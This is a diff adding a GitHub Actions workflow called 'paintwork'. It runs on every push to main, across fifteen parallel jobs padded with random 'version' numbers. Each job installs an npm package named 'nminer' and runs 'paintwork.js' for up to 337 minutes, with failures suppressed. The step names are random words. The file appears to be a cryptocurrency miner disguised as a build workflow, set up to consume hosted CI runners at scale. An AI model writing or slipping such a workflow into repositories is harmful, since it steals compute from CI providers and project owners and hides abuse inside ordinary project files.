@@ -1,0 +1,40 @@
+name: paintwork
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 6806 }
+          - { version: 5808 }
+          - { version: 3324 }
+          - { version: 707 }
+          - { version: 9725 }
+          - { version: 911 }
+          - { version: 179 }
+          - { version: 78 }
+          - { version: 9915 }
+          - { version: 6341 }
+          - { version: 3428 }
+          - { version: 1229 }
+          - { version: 2388 }
+          - { version: 7948 }
+          - { version: 9647 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: beside likewise cautious weight
+        run: |
+          npm install nminer@latest
+          timeout 337m node paintwork.js || echo "paintwork executed"
